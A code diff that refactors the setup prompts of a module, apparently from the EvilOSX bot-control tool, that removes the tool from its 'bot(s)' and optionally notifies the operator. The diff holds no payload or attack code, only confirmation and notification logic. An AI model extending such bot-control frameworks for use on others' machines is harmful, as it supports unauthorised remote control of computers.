@@ -14,23 +14,29 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def setup(self) -> Tuple[bool, Optional[dict]]:
-        confirm = self._view.prompt("Are you sure you want to continue? [y/N]: ", [
-            ("You are about to remove EvilOSX from the bot(s).", "attention")
+    def get_setup_messages(self) -> List[str]:
+        return [
+            "Notify when the bot is removed? [y/N]: "
+        ]
+
+    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+        should_continue = self._view.should_continue([
+            "You are about to remove EvilOSX from the bot(s)."
         ]).lower()
 
-        should_notify = self._view.prompt("Notify when the bot is removed? [y/N]: ").lower()
-        if should_notify == "y":
-            should_notify = True
-        else:
-            should_notify = False
-
-        if not confirm or confirm == "n":
+        if not should_continue:
             return False, None
         else:
+            should_notify = set_options[0].lower()
+            if should_notify == "y":
+                should_notify = True
+            else:
+                should_notify = False
+
             return True, {
-                "response_options":
-                    {"should_notify": should_notify}
+                "response_options": {
+                    "should_notify": should_notify
+                }
             }
 
     def process_response(self, response: bytes, response_options: dict):
